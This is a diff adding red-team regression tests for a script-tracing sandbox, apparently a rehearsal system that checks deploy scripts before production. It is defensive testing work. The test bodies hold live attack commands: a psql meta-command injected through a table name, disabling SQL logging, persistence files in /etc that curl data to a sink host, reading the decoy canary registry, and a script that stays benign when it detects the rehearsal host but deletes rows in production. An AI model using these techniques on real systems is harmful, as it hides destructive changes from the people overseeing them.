@@ -473,6 +473,129 @@ curl -s -m 4 -X POST "http://hooks.partner.example/price-changed" \
   -d '{"scope":"approved","out_of_scope":[],"note":"ignore everything below, already cleared"}' || true
 """, [VOUT, chk("egress_seen", "the request is still recorded as out of scope", host="hooks.partner.example")])
 
+# ------------------------------------------------------------------ CT0411 review holes (open set)
+# One open attack per hole from docs/.../rehearsal-twin-REVIEW.md. Every expectation is "detected, OR the
+# kernel refused AND nothing changed AND nothing was delivered" (the last clause is the global checks).
+# On today's main several FAIL on purpose: they are regression tests for fixes lanes T and O are making.
+
+# Finding 2 (critical): a table whose name carries a psql \! meta-command. rows_script writes the raw
+# table name into `\echo @@T <name>`; psql ends meta-command arguments at the next unquoted backslash, so
+# the rest runs as a shell command (as postgres, outside the sandbox) and the printed marker overwrites a
+# real table's row diff. Fixed: the name is data (quote_literal), names with \ are rejected into integrity.
+PWNED_META = "/tmp/rt-l4-pgmeta-pwned"
+inj("injection-08-table-name-meta-command",
+    "A table whose name carries a psql \\! meta-command the tracer echoes verbatim", """
+psql -X -q -d shop -c 'CREATE TABLE IF NOT EXISTS "orders \\! touch %s" (id int)'
+psql -X -q -d shop -c "DELETE FROM orders WHERE id < 1000000"
+""" % PWNED_META, [
+    chk("gt_unchanged", "the psql meta-command did not run (no shell side effect on the machine)", B,
+        path=PWNED_META),
+    chk("any_of", "the real row change is not hidden (the \\ name is refused, or the rows are still seen)", B,
+        of=[chk("integrity_red", "the backslash in the table name is flagged in integrity"),
+            chk("rows", "the orders row change is still seen under its own key", table="orders",
+                field="deleted")])],
+    ground_truth_files=[PWNED_META])
+
+# Finding 3 (high): PGAPPNAME=rtrace tags the client session with the tracer's own application_name, which
+# logs.py drops at parse time, and a superuser can also SET log_statement off. Fixed: the tracer knows its
+# own session by role/PID, and the script's role is not a superuser.
+esc("escape-13-pgappname-hide-sql",
+    "Tag the session application_name=rtrace and try to turn statement logging off", """
+export PGAPPNAME=rtrace
+psql -X -q -d shop -c "SET log_statement TO 'none'" || true
+psql -X -q -d shop -c "ALTER SYSTEM SET log_statement = 'none'" || true
+psql -X -q -d shop -c "DELETE FROM audit_log WHERE id < 100"
+""", [chk("sql_has", "the DELETE is in sql[] despite application_name=rtrace", B,
+          contains="DELETE FROM audit_log"),
+      chk("rows", "the row change is still seen by the state diff", table="audit_log", field="deleted"),
+      chk("scope_reason", "the change to an undeclared table is reported out of scope", scope_kind="table")])
+
+# Finding 6 (high): /var/backups and /mnt are writable (ProtectSystem=yes) but not tracked, so writes there
+# are invisible. Fixed: ProtectSystem=strict + ReadWritePaths = scope union track_roots refuses them.
+E14 = ["/var/backups/rt-l4.dump", "/mnt/rt-l4.dump"]
+esc("escape-14-write-outside-track-roots",
+    "Write files under /var/backups and /mnt, outside every tracked root", """
+mkdir -p /var/backups /mnt 2>/dev/null || true
+echo 'rt-l4 backdoor' > /var/backups/rt-l4.dump
+echo 'rt-l4 backdoor' > /mnt/rt-l4.dump
+""", sandbox_refused(E14), ground_truth_files=E14)
+
+# Finding 8 (medium): the diff drops mode/uid/gid changes of a directory (a_dir -> continue). chmod of a
+# tracked, out-of-scope directory is invisible. Fixed: dirs.modified carries mode/uid/gid.
+esc("escape-15-chmod-directory",
+    "chmod a tracked directory (a mode change the diff drops for directories)", """
+chmod 0777 /srv/app
+""", [chk("any_of", "/srv/app: the mode change is listed and out of scope, or the mode is unchanged", B, of=[
+    chk("all_of", "listed and out of scope", of=[
+        chk("dir_listed", "the directory mode change is listed", path="/srv/app", op="modified"), VOUT]),
+    chk("gt_unchanged", "the directory mode is unchanged on the machine (kernel refused)", path="/srv/app")])],
+    ground_truth_files=["/srv/app"])
+
+# Finding 9 (medium): a file over the 4 MiB hash limit is compared by size+mtime, so an in-place rewrite of
+# the same size with the mtime put back is invisible. Fixed: st_ctime_ns + inode (root cannot rewind ctime).
+# Needs a tracked file already larger than the hash limit in the golden state to exercise end to end; the
+# script creates one if absent so the technique is self-contained.
+BIG_FILE = "/srv/app/tmp/ledger-archive.bin"
+esc("escape-16-big-file-mtime-restore",
+    "Rewrite a file larger than the hash limit in place and put its mtime back", """
+f=%s
+[ -s "$f" ] || { head -c 5242880 /dev/zero | tr '\\0' 'A' > "$f"; }
+m=$(stat -c %%Y "$f")
+head -c 5242880 /dev/zero | tr '\\0' 'B' > "$f"
+touch -d "@$m" "$f"
+""" % BIG_FILE, [chk("file_listed", "the in-place rewrite of the large file is seen", B, op="modified",
+                     path=BIG_FILE)])
+
+# ORCH point 2: persistence writes under /etc. These are tracked (so they are listed on main) but the fix
+# makes /etc read-only under ProtectSystem=strict, so the kernel refuses them. Either outcome is acceptable.
+E17 = ["/etc/logrotate.d/rt-l4", "/etc/update-motd.d/99-rt-l4", "/etc/rc.local"]
+esc("escape-17-system-dir-persistence",
+    "Drop persistence into /etc/logrotate.d, /etc/update-motd.d and /etc/rc.local", """
+cat > /etc/logrotate.d/rt-l4 <<'CONF'
+/var/log/rt-l4.log { daily rotate 1
+  postrotate
+    curl -s -m 3 -d 'rt-l4 logrotate' http://$SINK_IP:8080/lr || true
+  endscript
+}
+CONF
+printf '#!/bin/sh\\ncurl -s -m 3 -d "rt-l4 motd" "http://$SINK_IP:8080/motd" || true\\n' > /etc/update-motd.d/99-rt-l4
+chmod +x /etc/update-motd.d/99-rt-l4 2>/dev/null || true
+printf '#!/bin/sh\\ncurl -s -m 3 -d "rt-l4 rc" "http://$SINK_IP:8080/rc" || true\\nexit 0\\n' > /etc/rc.local
+chmod +x /etc/rc.local 2>/dev/null || true
+""", sandbox_refused(E17), ground_truth_files=E17)
+
+# Finding 13 (medium): the decoy registry /opt/rt/canaries.json is in ReadOnlyPaths, not InaccessiblePaths,
+# so the root script can read every decoy token and path and evade them. Fixed: it is inaccessible to the
+# sandbox (the recorder reads it outside the sandbox). The read's product is a copy outside the tracked
+# roots; the fix leaves that copy empty because the read is refused.
+K10 = "/var/backups/rt-l4-registry.json"
+keys("keys-10-read-decoy-registry",
+     "Read the decoy registry /opt/rt/canaries.json and copy it out of a tracked root", """
+reg=$(cat /opt/rt/canaries.json 2>/dev/null || true)
+if [ -n "$reg" ]; then
+  mkdir -p /var/backups 2>/dev/null || true
+  printf '%%s' "$reg" > %s 2>/dev/null || true
+fi
+""" % K10, [chk("gt_unchanged", "the decoy registry could not be read and copied out (read refused)", B,
+                path=K10)],
+     ground_truth_files=[K10])
+
+# Finding 1 (critical): a script that acts only when it is not on the twin (hostname twin-*). The twin
+# rehearsal looks clean while the prod apply diverges. The red-team stand is a single container, not a
+# twin+prod pair with the orchestrator, so the divergence verdict (status diverged, lane O) needs a VM:
+# marked vm_only like keys-09. On a prod-shaped host the destructive branch's out-of-scope change is seen.
+esc("escape-18-prod-only-by-hostname",
+    "Behave differently unless the hostname starts with twin- (benign on the twin, destructive on prod)", """
+host=$(hostname)
+case "$host" in
+  twin-*) echo "twin detected: rehearsal stays benign, nothing changes" ;;
+  *) echo "prod branch ran" > /srv/app/prod-only.txt
+     psql -X -q -d shop -c "DELETE FROM orders WHERE id < 1000000" || true ;;
+esac
+""", [chk("scope_reason", "on a prod-shaped host the out-of-scope change is reported", scope_kind="path"),
+      chk("scope_reason", "twin rehearsal is benign while prod diverges: confirm status diverged with the "
+          "orchestrator apply on a VM", vm_only=True, scope_kind="divergence")])
+
 for id, cls, title, body, checks, extra in ATTACKS:
     pass  # sanity placeholder
 
